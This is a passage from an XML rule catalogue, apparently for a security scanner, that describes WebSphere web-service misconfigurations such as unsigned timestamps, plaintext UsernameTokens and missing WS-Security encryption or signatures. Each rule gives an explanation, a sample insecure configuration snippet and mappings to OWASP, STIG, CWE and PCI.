		</internalKey>
		<name>WebSphere Service Provider Misconfiguration: Unsigned Inbound
			Timestamp
		</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  An unsigned timestamp can leave a SOAP message open to tampering and replay attacks.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  A Security timestamp indicates a message's freshness. If an attacker intercepts a message retransmits it at a later time, the receiver can reject the replay attack because the timestamp will indicate that the message is stale. Optionally, timestamps can include an expiration attribute which places a hard limit on how long security semantics are valid.<br><br>To prevent attackers from tampering with timestamps, timestamps should be signed. Without a signed timestamp, an attacker can intercept a SOAP message, modify the timestamp, and send the message on without the receiver's knowledge. Under these circumstances, an attacker can potentially trick a recipient into accepting a malicious message.<br><br>The following service provider configuration tells WebSphere to accept unsigned inbound timestamps:<br><pre><br>&lt;com.ibm.etools.webservice.wsext:WsExtension xmi:version=&quot;2.0&quot; xmlns:xmi=&quot;http://www.omg.org/XMI&quot; xmlns:com.ibm.etools.webservice.wsext=&quot;http://www.ibm.com/websphere/appserver/schemas/5.0.2/wsext.xmi&quot; &lt;/pre&gt;<br>...<br>        &lt;securityRequestConsumerServiceConfig xmi:id=&quot;SecurityRequestConsumerServiceConfig_1211399165585&quot;&gt;<br>          &lt;addTimestamp xmi:id=&quot;AddTimestamp_1212094497592&quot;/&gt;<br>...<br>&lt;/com.ibm.etools.webservice.wsext:WsExtension&gt;<br></pre>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A10 Insecure Configuration Management</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A5 Security Misconfiguration</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A6 Security Misconfiguration</em> <br></p>
																									   <p>[4] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3860 CAT II</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3860 CAT II</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3860 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3860 CAT II</em> <br></p>
																									   <p>[8] Standards Mapping - FIPS200 - (FISMA) <em>CM</em> <br></p>
																									   <p>[9] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 345</em> <br></p>
																									   <p>[10] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>Insufficient Authentication</em> <br></p>
																									   <p>[11] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M3 Insufficient Transport Layer Protection</em> <br></p>
																									   <p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.10</em> <br></p>
																									   <p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.4</em> <br></p>
																									   <p>[14] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SC-8 Transmission Confidentiality and Integrity (P1)</em> <br></p>
																									   <p>[15]  <em>Web Services Handbook for WebSphere Application Server 6.1</em> IBM Redbooks<br></p>
																									   <p>[16]  <em>Web Services Security: SOAP Message Security 1.1</em> OASIS<br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>environment</tag>
	</rule>
	<rule>
		<key>environment_websphere_service_provider_misconfiguration_unsigned_outbound_timestamp
		</key>
		<internalKey>Environment/WebSphere Service Provider
			Misconfiguration/Unsigned Outbound Timestamp
		</internalKey>
		<name>WebSphere Service Provider Misconfiguration: Unsigned Outbound
			Timestamp
		</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  An unsigned timestamp can leave a SOAP message open to tampering and replay attacks.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  A Security timestamp indicates a message's freshness. If an attacker intercepts a message retransmits it at a later time, the receiver can reject the replay attack because the timestamp will indicate that the message is stale. Optionally, timestamps can include an expiration attribute which places a hard limit on how long security semantics are valid.<br><br>To prevent attackers from tampering with timestamps, timestamps should be signed. Without a signed timestamp, an attacker can intercept a SOAP message, modify the timestamp, and send the message on without the receiver's knowledge. Under these circumstances, an attacker can potentially trick a recipient into accepting a malicious message.<br><br>The following service provider configuration tells WebSphere to send an unsigned timestamp:<br><pre><br>&lt;com.ibm.etools.webservice.wsext:WsExtension xmi:version=&quot;2.0&quot; xmlns:xmi=&quot;http://www.omg.org/XMI&quot; xmlns:com.ibm.etools.webservice.wsext=&quot;http://www.ibm.com/websphere/appserver/schemas/5.0.2/wsext.xmi&quot; &lt;/pre&gt;<br>...<br>        &lt;securityResponseGeneratorServiceConfig xmi:id=&quot;SecurityResponseGeneratorServiceConfig_1211568020342&quot;&gt;<br>          &lt;addTimestamp xmi:id=&quot;AddTimestamp_1211568020342&quot;/&gt;<br>...<br>&lt;/com.ibm.etools.webservice.wsext:WsExtension&gt;<br></pre>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A10 Insecure Configuration Management</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A5 Security Misconfiguration</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A6 Security Misconfiguration</em> <br></p>
																									   <p>[4] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3860 CAT II</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3860 CAT II</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3860 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3860 CAT II</em> <br></p>
																									   <p>[8] Standards Mapping - FIPS200 - (FISMA) <em>CM</em> <br></p>
																									   <p>[9] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 345</em> <br></p>
																									   <p>[10] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>Insufficient Authentication</em> <br></p>
																									   <p>[11] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M3 Insufficient Transport Layer Protection</em> <br></p>
																									   <p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.10</em> <br></p>
																									   <p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.4</em> <br></p>
																									   <p>[14] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SC-8 Transmission Confidentiality and Integrity (P1)</em> <br></p>
																									   <p>[15]  <em>Web Services Handbook for WebSphere Application Server 6.1</em> IBM Redbooks<br></p>
																									   <p>[16]  <em>Web Services Security: SOAP Message Security 1.1</em> OASIS<br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>environment</tag>
	</rule>
	<rule>
		<key>environment_websphere_service_provider_misconfiguration_weak_token
		</key>
		<internalKey>Environment/WebSphere Service Provider
			Misconfiguration/Weak Token
		</internalKey>
		<name>WebSphere Service Provider Misconfiguration: Weak Token</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Using a UsernameToken with a plain text password over an unencrypted channel exposes the password to attackers who can sniff the SOAP messages.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Service Providers that use the UsernameToken might accept passwords sent in clear text. Sending cleartext passwords over an unencrypted channel can expose the credential to attackers who can sniff the SOAP message.<br><br>The following WebSphere service provider configuration uses the UsernameToken:<br><pre><br>&lt;com.ibm.etools.webservice.wsext:WsExtension xmi:version=&quot;2.0&quot; xmlns:xmi=&quot;http://www.omg.org/XMI&quot; xmlns:com.ibm.etools.webservice.wsext=&quot;http://www.ibm.com/websphere/appserver/schemas/5.0.2/wsext.xmi&quot; xmi:id=&quot;WsExtension_1152150731239&quot;&gt;<br>...<br>        &lt;securityRequestConsumerServiceConfig xmi:id=&quot;SecurityRequestConsumerServiceConfig_1211399165585&quot;&gt;<br>          &lt;requiredSecurityToken xmi:id=&quot;RequiredSecurityToken_1211399165605&quot; name=&quot;Token_34865684&quot; uri=&quot;&quot; localName=&quot;http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-username-token-profile-1.0#UsernameToken&quot; usage=&quot;Required&quot;/&gt;<br>...<br>&lt;/com.ibm.etools.webservice.wsext:WsExtension&gt;<br></pre>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A5 Security Misconfiguration</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A7 Insecure Cryptographic Storage</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A8 Insecure Cryptographic Storage</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A8 Insecure Storage</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II, APP3330 CAT I</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II, APP3330 CAT I</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II, APP3330 CAT I</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II, APP3330 CAT I</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II, APP3330 CAT I</em> <br></p>
																									   <p>[10] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 311</em> <br></p>
																									   <p>[11] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>Insufficient Authentication</em> <br></p>
																									   <p>[12] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M3 Insufficient Transport Layer Protection</em> <br></p>
																									   <p>[13] Standards Mapping - FIPS200 - (FISMA) <em>MP</em> <br></p>
																									   <p>[14] Standards Mapping - SANS Top 25 2010 - (SANS 2010) <em>Porous Defenses - CWE ID 311</em> <br></p>
																									   <p>[15] Standards Mapping - SANS Top 25 2011 - (SANS Top 25 2011) <em>Porous Defenses - CWE ID 311</em> <br></p>
																									   <p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 4.1, Requirement 6.3.1.3, Requirement 6.5.8, Requirement 8.4</em> <br></p>
																									   <p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 4.1, Requirement 6.5.3, Requirement 8.2.1</em> <br></p>
																									   <p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 4.1, Requirement 6.5.3, Requirement 8.4</em> <br></p>
																									   <p>[19] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 4.1, Requirement 6.5.8, Requirement 8.4</em> <br></p>
																									   <p>[20] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SC-8 Transmission Confidentiality and Integrity (P1)</em> <br></p>
																									   <p>[21]  <em>Web Services Security Username Token Profile 1.0</em> OASIS<br></p>
																									   <p>[22]  <em>Web Services Security: SOAP Message Security 1.1</em> OASIS<br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>environment</tag>
	</rule>
	<rule>
		<key>environment_websphere_service_requester_misconfiguration_inbound_ws_security_not_enabled
		</key>
		<internalKey>Environment/WebSphere Service Requester
			Misconfiguration/Inbound WS-Security Not Enabled
		</internalKey>
		<name>WebSphere Service Requester Misconfiguration: Inbound
			WS-Security Not Enabled
		</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Requests that do not use WS-Security make it hard to guarantee message integrity or confidentiality.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  WS-Security is an enhancement to SOAP that provides end-to-end message integrity and confidential regardless of the transport protocol. When WS-Security is not used, message rely on transport security for integrity and confidentiality. If a service relays messages to other services, messages are exposed to the weakest transport mechanism used between relay points. WS-Security removes the transport security dependency and builds security into the message.<br><br> The absence of an <code>&lt;securityResponseConsumerServiceConfig&gt;</code> tag in the IBM WebSphere WS-Security client deployment descriptor extension file indicates that outbound message security is not enabled.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A10 Insecure Configuration Management</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A5 Security Misconfiguration</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A9 Insecure Communications</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A9 Insufficient Transport Layer Protection</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</em> <br></p>
																									   <p>[10] Standards Mapping - FIPS200 - (FISMA) <em>CM</em> <br></p>
																									   <p>[11] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 311</em> <br></p>
																									   <p>[12] Standards Mapping - SANS Top 25 2009 - (SANS 2009) <em>Insecure Interaction - CWE ID 319</em> <br></p>
																									   <p>[13] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>Insufficient Authentication</em> <br></p>
																									   <p>[14] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M3 Insufficient Transport Layer Protection</em> <br></p>
																									   <p>[15] Standards Mapping - SANS Top 25 2010 - (SANS 2010) <em>Porous Defenses - CWE ID 311</em> <br></p>
																									   <p>[16] Standards Mapping - SANS Top 25 2011 - (SANS Top 25 2011) <em>Porous Defenses - CWE ID 311</em> <br></p>
																									   <p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 4.1, Requirement 6.3.1.4, Requirement 6.5.9</em> <br></p>
																									   <p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 4.1, Requirement 6.5.10</em> <br></p>
																									   <p>[19] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 4.1, Requirement 6.5.4</em> <br></p>
																									   <p>[20] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 4.1, Requirement 6.5.4</em> <br></p>
																									   <p>[21] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SC-8 Transmission Confidentiality and Integrity (P1)</em> <br></p>
																									   <p>[22]  <em>Web Services Handbook for WebSphere Application Server 6.1</em> IBM Redbooks<br></p>
																									   <p>[23]  <em>Web Services Security SOAP Message Security 1.1</em> OASIS<br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>environment</tag>
	</rule>
	<rule>
		<key>environment_websphere_service_requester_misconfiguration_missing_inbound_encryption
		</key>
		<internalKey>Environment/WebSphere Service Requester
			Misconfiguration/Missing Inbound Encryption
		</internalKey>
		<name>WebSphere Service Requester Misconfiguration: Missing Inbound
			Encryption
		</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Unencrypted messages fail to protect confidentiality.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Encryption at the SOAP message level ensures true end-to-end confidentiality. SOAP messages can be sent over a number transport protocols such as HTTPS, HTTP, TCP, SMTP, UDP, etc. Message-level encryption ensures the confidentiality of the message regardless of the transport protocol. A common scenario among web services is to relay SOAP messages between services, so message-level encryption means message senders and receivers do not need to worry about all transport security between relay points.<br><br>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A10 Insecure Configuration Management</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A5 Security Misconfiguration</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A9 Insecure Communications</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A9 Insufficient Transport Layer Protection</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</em> <br></p>
																									   <p>[10] Standards Mapping - FIPS200 - (FISMA) <em>CM</em> <br></p>
																									   <p>[11] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 311</em> <br></p>
																									   <p>[12] Standards Mapping - SANS Top 25 2009 - (SANS 2009) <em>Insecure Interaction - CWE ID 319</em> <br></p>
																									   <p>[13] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>Insufficient Authentication</em> <br></p>
																									   <p>[14] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M3 Insufficient Transport Layer Protection</em> <br></p>
																									   <p>[15] Standards Mapping - SANS Top 25 2010 - (SANS 2010) <em>Porous Defenses - CWE ID 311</em> <br></p>
																									   <p>[16] Standards Mapping - SANS Top 25 2011 - (SANS Top 25 2011) <em>Porous Defenses - CWE ID 311</em> <br></p>
																									   <p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 4.1, Requirement 6.3.1.4, Requirement 6.5.9</em> <br></p>
																									   <p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 4.1, Requirement 6.5.10</em> <br></p>
																									   <p>[19] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 4.1, Requirement 6.5.4</em> <br></p>
																									   <p>[20] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 4.1, Requirement 6.5.4</em> <br></p>
																									   <p>[21] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SC-8 Transmission Confidentiality and Integrity (P1)</em> <br></p>
																									   <p>[22]  <em>Web Services Handbook for WebSphere Application Server 6.1</em> IBM Redbooks<br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>environment</tag>
	</rule>
	<rule>
		<key>environment_websphere_service_requester_misconfiguration_missing_inbound_signature
		</key>
		<internalKey>Environment/WebSphere Service Requester
			Misconfiguration/Missing Inbound Signature
		</internalKey>
		<name>WebSphere Service Requester Misconfiguration: Missing Inbound
			Signature
		</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  A missing signature means the integrity of a SOAP message cannot be guaranteed.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Any part of a message that is not signed has the potential to be intercepted and modified without the knowledge of the sender or the receiver. Without a signature, the receiver cannot cryptographically verify that the contents of a message really originated with the sender.<br><br>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A10 Insecure Configuration Management</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A5 Security Misconfiguration</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A6 Security Misconfiguration</em> <br></p>
																									   <p>[4] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3860 CAT II</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3860 CAT II</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3860 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3860 CAT II</em> <br></p>
																									   <p>[8] Standards Mapping - FIPS200 - (FISMA) <em>CM</em> <br></p>
																									   <p>[9] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 345</em> <br></p>
																									   <p>[10] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>Insufficient Authentication</em> <br></p>
																									   <p>[11] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M3 Insufficient Transport Layer Protection</em> <br></p>
																									   <p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.10</em> <br></p>
																									   <p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.4</em> <br></p>
																									   <p>[14] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SC-8 Transmission Confidentiality and Integrity (P1)</em> <br></p>
																									   <p>[15]  <em>Web Services Handbook for WebSphere Application Server 6.1</em> IBM Redbooks<br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>environment</tag>
	</rule>
	<rule>
		<key>environment_websphere_service_requester_misconfiguration_missing_inbound_timestamp
		</key>
		<internalKey>Environment/WebSphere Service Requester
			Misconfiguration/Missing Inbound Timestamp
		</internalKey>
		<name>WebSphere Service Requester Misconfiguration: Missing Inbound
			Timestamp
		</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  A missing timestamp can leave a SOAP message open to replay attacks.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  A Security timestamp indicates a message's freshness. If an attacker intercepts a message retransmits it at a later time, the receiver can reject the replay attack because the timestamp will indicate that the message is stale. Optionally, timestamps can include an expiration attribute which places a hard limit on how long security semantics are valid.<br><br>To prevent attackers from tampering with timestamps, timestamps should be signed. Without a signed timestamp, it might be possible to intercept a SOAP message, modify the timestamp, and send the message on without the receiver's knowledge. Under these circumstances, an attacker can potentially trick a recipient into accepting a malicious message.<br><br>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A10 Insecure Configuration Management</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A5 Security Misconfiguration</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A6 Security Misconfiguration</em> <br></p>
																									   <p>[4] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3870 CAT I</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3870 CAT I</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3870 CAT I</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3870 CAT I</em> <br></p>
																									   <p>[8] Standards Mapping - FIPS200 - (FISMA) <em>CM</em> <br></p>
																									   <p>[9] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 254</em> <br></p>
																									   <p>[10] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>Insufficient Authentication</em> <br></p>
																									   <p>[11] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M3 Insufficient Transport Layer Protection</em> <br></p>
																									   <p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.10</em> <br></p>
																									   <p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.4</em> <br></p>
																									   <p>[14] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SC-8 Transmission Confidentiality and Integrity (P1)</em> <br></p>
																									   <p>[15]  <em>Web Services Handbook for WebSphere Application Server 6.1</em> IBM Redbooks<br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>environment</tag>
	</rule>
	<rule>
		<key>environment_websphere_service_requester_misconfiguration_missing_outbound_encryption
		</key>
		<internalKey>Environment/WebSphere Service Requester
			Misconfiguration/Missing Outbound Encryption
		</internalKey>
		<name>WebSphere Service Requester Misconfiguration: Missing Outbound
			Encryption
		</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Unencrypted messages fail to protect confidentiality.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Encryption at the SOAP message level ensures true end-to-end confidentiality. SOAP messages can be sent over a number transport protocols such as HTTPS, HTTP, TCP, SMTP, UDP, etc. Message-level encryption ensures the confidentiality of the message regardless of the transport protocol. A common scenario among web services is to relay SOAP messages between services, so message-level encryption means message senders and receivers do not need to worry about all transport security between any relay points.<br><br>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A10 Insecure Configuration Management</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A5 Security Misconfiguration</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A9 Insecure Communications</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A9 Insufficient Transport Layer Protection</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</em> <br></p>
																									   <p>[10] Standards Mapping - FIPS200 - (FISMA) <em>CM</em> <br></p>
																									   <p>[11] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 311</em> <br></p>
																									   <p>[12] Standards Mapping - SANS Top 25 2009 - (SANS 2009) <em>Insecure Interaction - CWE ID 319</em> <br></p>
																									   <p>[13] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>Insufficient Authentication</em> <br></p>
																									   <p>[14] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M3 Insufficient Transport Layer Protection</em> <br></p>
